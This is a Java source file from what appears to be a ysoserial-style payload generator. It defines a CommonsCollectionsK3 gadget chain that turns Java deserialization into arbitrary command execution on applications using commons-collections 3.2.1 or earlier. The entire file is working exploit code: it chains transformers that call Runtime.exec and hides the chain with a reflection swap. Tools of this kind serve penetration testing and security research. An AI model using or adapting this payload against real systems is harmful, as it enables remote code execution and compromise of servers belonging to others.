package me.gv7.woodpecker.yso.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
Gadget chain:
    java.util.HashMap.readObject()
        java.util.HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.getValue()
                LazyMap.get()
                    ChainedTransformer.transform()
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({Authors.KORLR})
public class CommonsCollectionsK3 extends PayloadRunner implements ObjectPayload<Map> {

    public Map getObject(final String command) throws Exception {
        final String[] execArgs = new String[]{command};

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{
                String.class, Class[].class}, new Object[]{
                "getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{
                Object.class, Object[].class}, new Object[]{
                null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class}, execArgs),
            new ConstantTransformer(new HashSet<String>())};

        ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.decorate(innerMap, inertChain);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, "v");
        outerMap.put(tied, "t");
        innerMap.clear();

        Reflections.setFieldValue(inertChain, "iTransformers", transformers);
        return outerMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsK3.class, args);
    }
}
